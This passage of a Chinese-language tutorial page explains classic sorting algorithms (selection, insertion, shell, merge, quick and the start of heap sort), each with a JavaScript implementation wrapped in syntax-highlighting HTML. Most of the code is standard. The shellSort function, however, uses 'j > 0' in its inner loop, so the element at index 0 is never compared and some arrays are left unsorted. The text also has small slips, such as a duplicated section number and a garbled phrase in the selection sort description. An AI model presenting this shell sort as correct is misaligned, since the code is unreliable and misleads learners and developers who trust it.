punctuation">.</span>length<span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> len <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> len <span class="token operator">-</span> <span class="token number">1</span> <span class="token operator">-</span> i<span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>arr<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">></span> arr<span class="token punctuation">[</span>j<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>       <span class="token comment" spellcheck="true">// 相邻元素两两对比</span>                <span class="token keyword">var</span> temp <span class="token operator">=</span> arr<span class="token punctuation">[</span>j<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>       <span class="token comment" spellcheck="true">// 元素交换</span>                arr<span class="token punctuation">[</span>j<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> arr<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span>                arr<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> temp<span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> arr<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="选择排序（Selection-Sort）"><a href="#选择排序（Selection-Sort）" class="headerlink" title="选择排序（Selection Sort）"></a>选择排序（Selection Sort）</h2><p>选择排序(Selection-sort)是一种简单直观的排序算法。它的工作原理：首先在未排序序列中找到最小（大）元素，存放到排序序列的起始位置，然后，再从剩余未排序元素中继续寻找最小（大）元素，然后放到已排序序列的末尾。以此类推，直到所有元素均排序完毕。 </p><h3 id="2-1-算法描述"><a href="#2-1-算法描述" class="headerlink" title="2.1 算法描述"></a>2.1 算法描述</h3><p>n个记录的直接选择排序可经过n-1趟直接选择排序得到有序结果。具体算法描述如下：</p><ul><li>初始状态：无序区为R[1..n]，有序区为空；</li><li>第i趟排序(i=1,2,3…n-1)开始时，当前有序区和无序区分别为R[1..i-1]和R(i..n）。该趟排序从当前无序区中-选出关键字最小的记录 R[k]，将它与无序区的第1个记录R交换，使R[1..i]和R[i+1..n)分别变为记录个数增加1个的新有序区和记录个数减少1个的新无序区；</li><li>n-1趟结束，数组有序化了。</li></ul><h3 id="2-2-动图演示"><a href="#2-2-动图演示" class="headerlink" title="2.2 动图演示"></a>2.2 动图演示</h3><p><img src="https://img.58cdn.com.cn/escstatic/fecar/pmuse/docmanager/sf2.gif" alt="img">　　</p><h3 id="2-3-代码实现"><a href="#2-3-代码实现" class="headerlink" title="2.3 代码实现"></a>2.3 代码实现</h3><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">function</span> <span class="token function">selectionSort</span><span class="token punctuation">(</span>arr<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">var</span> len <span class="token operator">=</span> arr<span class="token punctuation">.</span>length<span class="token punctuation">;</span>    <span class="token keyword">var</span> minIndex<span class="token punctuation">,</span> temp<span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> len <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        minIndex <span class="token operator">=</span> i<span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> j <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> len<span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>arr<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">&lt;</span> arr<span class="token punctuation">[</span>minIndex<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// 寻找最小的数</span>                minIndex <span class="token operator">=</span> j<span class="token punctuation">;</span>                <span class="token comment" spellcheck="true">// 将最小数的索引保存</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        temp <span class="token operator">=</span> arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>        arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> arr<span class="token punctuation">[</span>minIndex<span class="token punctuation">]</span><span class="token punctuation">;</span>        arr<span class="token punctuation">[</span>minIndex<span class="token punctuation">]</span> <span class="token operator">=</span> temp<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> arr<span class="token punctuation">;</span><span class="token punctuation">}</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="2-4-算法分析"><a href="#2-4-算法分析" class="headerlink" title="2.4 算法分析"></a>2.4 算法分析</h3><p>表现最稳定的排序算法之一，因为无论什么数据进去都是O(n2)的时间复杂度，所以用到它的时候，数据规模越小越好。唯一的好处可能就是不占用额外的内存空间了吧。理论上讲，选择排序可能也是平时排序一般人想到的最多的排序方法了吧。</p><h2 id="插入排序（Insertion-Sort）"><a href="#插入排序（Insertion-Sort）" class="headerlink" title="插入排序（Insertion Sort）"></a>插入排序（Insertion Sort）</h2><p>插入排序（Insertion-Sort）的算法描述是一种简单直观的排序算法。它的工作原理是通过构建有序序列，对于未排序数据，在已排序序列中从后向前扫描，找到相应位置并插入。</p><h3 id="3-1-算法描述"><a href="#3-1-算法描述" class="headerlink" title="3.1 算法描述"></a>3.1 算法描述</h3><p>一般来说，插入排序都采用in-place在数组上实现。具体算法描述如下：</p><ul><li>从第一个元素开始，该元素可以认为已经被排序；</li><li>取出下一个元素，在已经排序的元素序列中从后向前扫描；</li><li>如果该元素（已排序）大于新元素，将该元素移到下一位置；</li><li>重复步骤3，直到找到已排序的元素小于或者等于新元素的位置；</li><li>将新元素插入到该位置后；</li><li>重复步骤2~5。</li></ul><h3 id="3-2-动图演示"><a href="#3-2-动图演示" class="headerlink" title="3.2 动图演示"></a>3.2 动图演示</h3><p><img src="https://img.58cdn.com.cn/escstatic/fecar/pmuse/docmanager/sf3.gif" alt="img"></p><h3 id="3-2-代码实现"><a href="#3-2-代码实现" class="headerlink" title="3.2 代码实现"></a>3.2 代码实现</h3><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">function</span> <span class="token function">insertionSort</span><span class="token punctuation">(</span>arr<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">var</span> len <span class="token operator">=</span> arr<span class="token punctuation">.</span>length<span class="token punctuation">;</span>    <span class="token keyword">var</span> preIndex<span class="token punctuation">,</span> current<span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> len<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        preIndex <span class="token operator">=</span> i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>        current <span class="token operator">=</span> arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span>preIndex <span class="token operator">>=</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> arr<span class="token punctuation">[</span>preIndex<span class="token punctuation">]</span> <span class="token operator">></span> current<span class="token punctuation">)</span> <span class="token punctuation">{</span>            arr<span class="token punctuation">[</span>preIndex <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> arr<span class="token punctuation">[</span>preIndex<span class="token punctuation">]</span><span class="token punctuation">;</span>            preIndex<span class="token operator">--</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        arr<span class="token punctuation">[</span>preIndex <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> current<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> arr<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="3-4-算法分析"><a href="#3-4-算法分析" class="headerlink" title="3.4 算法分析"></a>3.4 算法分析</h3><p>插入排序在实现上，通常采用in-place排序（即只需用到O(1)的额外空间的排序），因而在从后向前扫描过程中，需要反复把已排序元素逐步向后挪位，为最新元素提供插入空间。</p><h2 id="希尔排序（Shell-Sort）"><a href="#希尔排序（Shell-Sort）" class="headerlink" title="希尔排序（Shell Sort）"></a>希尔排序（Shell Sort）</h2><p>1959年Shell发明，第一个突破O(n2)的排序算法，是简单插入排序的改进版。它与插入排序的不同之处在于，它会优先比较距离较远的元素。希尔排序又叫<strong>缩小增量排序</strong>。</p><h3 id="4-1-算法描述"><a href="#4-1-算法描述" class="headerlink" title="4.1 算法描述"></a>4.1 算法描述</h3><p>先将整个待排序的记录序列分割成为若干子序列分别进行直接插入排序，具体算法描述：</p><ul><li>选择一个增量序列t1，t2，…，tk，其中ti&gt;tj，tk=1；</li><li>按增量序列个数k，对序列进行k 趟排序；</li><li>每趟排序，根据对应的增量ti，将待排序列分割成若干长度为m 的子序列，分别对各子表进行直接插入排序。仅增量因子为1 时，整个序列作为一个表来处理，表长度即为整个序列的长度。</li></ul><h3 id="4-2-动图演示"><a href="#4-2-动图演示" class="headerlink" title="4.2 动图演示"></a>4.2 动图演示</h3><p><img src="https://img.58cdn.com.cn/escstatic/fecar/pmuse/docmanager/sf4.gif" alt="img"></p><h3 id="4-3-代码实现"><a href="#4-3-代码实现" class="headerlink" title="4.3 代码实现"></a>4.3 代码实现</h3><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">function</span> <span class="token function">shellSort</span><span class="token punctuation">(</span>arr<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">var</span> len <span class="token operator">=</span> arr<span class="token punctuation">.</span>length<span class="token punctuation">,</span>        temp<span class="token punctuation">,</span>        gap <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>gap <span class="token operator">&lt;</span> len <span class="token operator">/</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>         <span class="token comment" spellcheck="true">// 动态定义间隔序列</span>        gap <span class="token operator">=</span> gap <span class="token operator">*</span> <span class="token number">3</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span>gap<span class="token punctuation">;</span> gap <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">;</span> gap <span class="token operator">=</span> Math<span class="token punctuation">.</span><span class="token function">floor</span><span class="token punctuation">(</span>gap <span class="token operator">/</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> i <span class="token operator">=</span> gap<span class="token punctuation">;</span> i <span class="token operator">&lt;</span> len<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            temp <span class="token operator">=</span> arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> j <span class="token operator">=</span> i<span class="token operator">-</span>gap<span class="token punctuation">;</span> j <span class="token operator">></span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> arr<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">></span> temp<span class="token punctuation">;</span> j<span class="token operator">-</span><span class="token operator">=</span>gap<span class="token punctuation">)</span> <span class="token punctuation">{</span>                arr<span class="token punctuation">[</span>j <span class="token operator">+</span> gap<span class="token punctuation">]</span> <span class="token operator">=</span> arr<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            arr<span class="token punctuation">[</span>j <span class="token operator">+</span> gap<span class="token punctuation">]</span> <span class="token operator">=</span> temp<span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> arr<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="4-4-算法分析"><a href="#4-4-算法分析" class="headerlink" title="4.4 算法分析"></a>4.4 算法分析</h3><p>希尔排序的核心在于间隔序列的设定。既可以提前设定好间隔序列，也可以动态的定义间隔序列。动态定义间隔序列的算法是《算法（第4版）》的合著者Robert Sedgewick提出的。　</p><h2 id="归并排序（Merge-Sort）"><a href="#归并排序（Merge-Sort）" class="headerlink" title="归并排序（Merge Sort）"></a>归并排序（Merge Sort）</h2><p>归并排序是建立在归并操作上的一种有效的排序算法。该算法是采用分治法（Divide and Conquer）的一个非常典型的应用。将已有序的子序列合并，得到完全有序的序列；即先使每个子序列有序，再使子序列段间有序。若将两个有序表合并成一个有序表，称为2-路归并。 </p><h3 id="5-1-算法描述"><a href="#5-1-算法描述" class="headerlink" title="5.1 算法描述"></a>5.1 算法描述</h3><ul><li>把长度为n的输入序列分成两个长度为n/2的子序列；</li><li>对这两个子序列分别采用归并排序；</li><li>将两个排序好的子序列合并成一个最终的排序序列。</li></ul><h3 id="5-2-动图演示"><a href="#5-2-动图演示" class="headerlink" title="5.2 动图演示"></a>5.2 动图演示</h3><p><img src="https://img.58cdn.com.cn/escstatic/fecar/pmuse/docmanager/sf5.gif" alt="img"></p><h3 id="5-3-代码实现"><a href="#5-3-代码实现" class="headerlink" title="5.3 代码实现"></a>5.3 代码实现</h3><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">function</span> <span class="token function">mergeSort</span><span class="token punctuation">(</span>arr<span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment" spellcheck="true">// 采用自上而下的递归方法</span>    <span class="token keyword">var</span> len <span class="token operator">=</span> arr<span class="token punctuation">.</span>length<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>len <span class="token operator">&lt;</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> arr<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">var</span> middle <span class="token operator">=</span> Math<span class="token punctuation">.</span><span class="token function">floor</span><span class="token punctuation">(</span>len <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        left <span class="token operator">=</span> arr<span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> middle<span class="token punctuation">)</span><span class="token punctuation">,</span>        right <span class="token operator">=</span> arr<span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">(</span>middle<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token function">merge</span><span class="token punctuation">(</span><span class="token function">mergeSort</span><span class="token punctuation">(</span>left<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">mergeSort</span><span class="token punctuation">(</span>right<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">merge</span><span class="token punctuation">(</span>left<span class="token punctuation">,</span> right<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">var</span> result <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>left<span class="token punctuation">.</span>length<span class="token operator">></span><span class="token number">0</span> <span class="token operator">&amp;&amp;</span> right<span class="token punctuation">.</span>length<span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>left<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">&lt;=</span> right<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            result<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>left<span class="token punctuation">.</span><span class="token function">shift</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token punctuation">{</span>            result<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>right<span class="token punctuation">.</span><span class="token function">shift</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>left<span class="token punctuation">.</span>length<span class="token punctuation">)</span>        result<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>left<span class="token punctuation">.</span><span class="token function">shift</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>right<span class="token punctuation">.</span>length<span class="token punctuation">)</span>        result<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>right<span class="token punctuation">.</span><span class="token function">shift</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> result<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="5-4-算法分析"><a href="#5-4-算法分析" class="headerlink" title="5.4 算法分析"></a>5.4 算法分析</h3><p>归并排序是一种稳定的排序方法。和选择排序一样，归并排序的性能不受输入数据的影响，但表现比选择排序好的多，因为始终都是O(nlogn）的时间复杂度。代价是需要额外的内存空间。</p><h2 id="快速排序（Quick-Sort）"><a href="#快速排序（Quick-Sort）" class="headerlink" title="快速排序（Quick Sort）"></a>快速排序（Quick Sort）</h2><p>快速排序的基本思想：通过一趟排序将待排记录分隔成独立的两部分，其中一部分记录的关键字均比另一部分的关键字小，则可分别对这两部分记录继续进行排序，以达到整个序列有序。</p><h3 id="6-1-算法描述"><a href="#6-1-算法描述" class="headerlink" title="6.1 算法描述"></a>6.1 算法描述</h3><p>快速排序使用分治法来把一个串（list）分为两个子串（sub-lists）。具体算法描述如下：</p><ul><li>从数列中挑出一个元素，称为 “基准”（pivot）；</li><li>重新排序数列，所有元素比基准值小的摆放在基准前面，所有元素比基准值大的摆在基准的后面（相同的数可以到任一边）。在这个分区退出之后，该基准就处于数列的中间位置。这个称为分区（partition）操作；</li><li>递归地（recursive）把小于基准值元素的子数列和大于基准值元素的子数列排序。</li></ul><h3 id="6-2-动图演示"><a href="#6-2-动图演示" class="headerlink" title="6.2 动图演示"></a>6.2 动图演示</h3><p><img src="https://img.58cdn.com.cn/escstatic/fecar/pmuse/docmanager/sf6.gif" alt="img"></p><h3 id="6-3-代码实现"><a href="#6-3-代码实现" class="headerlink" title="6.3 代码实现"></a>6.3 代码实现</h3><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">function</span> <span class="token function">quickSort</span><span class="token punctuation">(</span>arr<span class="token punctuation">,</span> left<span class="token punctuation">,</span> right<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">var</span> len <span class="token operator">=</span> arr<span class="token punctuation">.</span>length<span class="token punctuation">,</span>        partitionIndex<span class="token punctuation">,</span>        left <span class="token operator">=</span><span class="token keyword">typeof</span> left <span class="token operator">!=</span><span class="token string">'number'</span> <span class="token operator">?</span> <span class="token number">0</span> <span class="token punctuation">:</span> left<span class="token punctuation">,</span>        right <span class="token operator">=</span><span class="token keyword">typeof</span> right <span class="token operator">!=</span><span class="token string">'number'</span> <span class="token operator">?</span> len <span class="token operator">-</span> <span class="token number">1</span> <span class="token punctuation">:</span> right<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>left <span class="token operator">&lt;</span> right<span class="token punctuation">)</span> <span class="token punctuation">{</span>        partitionIndex <span class="token operator">=</span> <span class="token function">partition</span><span class="token punctuation">(</span>arr<span class="token punctuation">,</span> left<span class="token punctuation">,</span> right<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">quickSort</span><span class="token punctuation">(</span>arr<span class="token punctuation">,</span> left<span class="token punctuation">,</span> partitionIndex<span class="token number">-1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">quickSort</span><span class="token punctuation">(</span>arr<span class="token punctuation">,</span> partitionIndex<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span> right<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> arr<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">partition</span><span class="token punctuation">(</span>arr<span class="token punctuation">,</span> left <span class="token punctuation">,</span>right<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// 分区操作</span>    <span class="token keyword">var</span> pivot <span class="token operator">=</span> left<span class="token punctuation">,</span>                     <span class="token comment" spellcheck="true">// 设定基准值（pivot）</span>        index <span class="token operator">=</span> pivot <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> i <span class="token operator">=</span> index<span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> right<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&lt;</span> arr<span class="token punctuation">[</span>pivot<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token function">swap</span><span class="token punctuation">(</span>arr<span class="token punctuation">,</span> i<span class="token punctuation">,</span> index<span class="token punctuation">)</span><span class="token punctuation">;</span>            index<span class="token operator">++</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>           <span class="token punctuation">}</span>    <span class="token function">swap</span><span class="token punctuation">(</span>arr<span class="token punctuation">,</span> pivot<span class="token punctuation">,</span> index <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> index<span class="token number">-1</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">swap</span><span class="token punctuation">(</span>arr<span class="token punctuation">,</span> i<span class="token punctuation">,</span> j<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">var</span> temp <span class="token operator">=</span> arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>    arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> arr<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span>    arr<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> temp<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="堆排序（Heap-Sort）"><a href="#堆排序（Heap-Sort）" class="headerlink" title="堆排序（Heap Sort）"></a>堆排序（Heap Sort）</h2><p>堆排序（Heapsort）是指利用堆这种数据结构所设计的一种排序算法。堆积是一个近似完全二叉树的结构，并同时满足堆积的性质：即子结点的键值或索引总是小于（或者大于）它的父节点。</p><h3 id="7-1-算法描述"><a href="#7-1-算法描述" class="headerlink" title="7.1 算法描述"></a>7.1 算法描述</h3><ul><li>将初始待排序关键字序列(R1,R2….Rn)构建成大顶堆，此堆为初始的无序区；</li><li>将堆顶元素R[1]与最后一个元素R[n]交换，此时得到新的无序区(R1,R2,……Rn-1)和新的有序区(Rn),且满足R[1,2…n-1]&lt;=R[n]；</li><li>由于交换后新的堆顶R[1]可能违反堆的性质，因此需要对当前无序区(R1,R2,……Rn-1)调整为新堆，然后再次将R[1]与无序区最后一个元素交换，得到新的无序区(R1,R2….Rn-2)和新的有序区(Rn-1,Rn)。不断重复此过程直到有序区的元素个数为n-1，则整个排序过程完成。</li></ul><h3 id="7-2-动图演示"><a href="#7-2-动图演示" class="headerlink" title="7.2 动图演示"></a>7.2 动图演示</h3><p><img src="https://img.58cdn.com.cn/escstatic/fecar/pmuse/docmanager/sf7.gif" alt="img"></p><h3 id="7-3-代码实现"><a href="#7-3-代码实现" class="headerlink" title="7.3 代码实现"></a>7.3 代码实现</h3><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">var</span> len<span class="token punctuation">;</span>   <span class="token comment" spellcheck="true">// 因为声明的多个函数都需要数据长度，所以把len设置成为全局变量</span><span class="token keyword">function</span> <span class="token function">buildMaxHeap</span><span class="token punctuation">(</span>arr<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">// 建立大顶堆</span>    len <span class="token operator">=</span> arr<span class="token punctuation">.</span>length<span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> i <span class="token operator">=</span> Math<span class="token punctuation">.</span><span class="token function">floor</span><span class="token punctuation">(</span>len<span class="token operator">/</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span> i <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">--</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">heapify</span><span class="token punctuation">(</span>arr<span class="token punctuation">,</span> i<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">heapify</span><span class="token punctuation">(</span>arr<span class="token punctuation">,</span> i<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// 堆调整</span>    <span class="token keyword">var</span> left <span class="token operator">=</span> <span class="token number">2</span> <span class="token operator">*</span> i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span>        right <span class="token operator">=</span> <span class="token number">2</span> <span class="token operator">*</span> i <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">,</span>        largest <span class="token operator">=</span> i<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>left <span class="token operator">&lt;</span> len <span class="token operator">&amp;&amp;</span> arr<span class="token punctuation">[</span>left<span class="token punctuation">]</span> <span class="token operator">></span> arr<span class="token punctuation">[</span>largest<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        largest <span class="token operator">=</span> left<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>right <span class="token operator">&lt;</span> len <span class="token operator">&amp;&amp;</span> arr<span class="token punctuation">[</span>right<span class="token punctuation">]</span> <span class="token operator">></span> arr<span class="token punctuation">[</span>largest<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        largest <span class="token operator">=</span> right<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>largest <span class="token operator">!=</span> i<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">swap</span><span class="token punctuation">(</span>arr<span class="token punctuation">,</span> i<span class="token punctuation">,</span> largest<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">heapify</span><span class="token 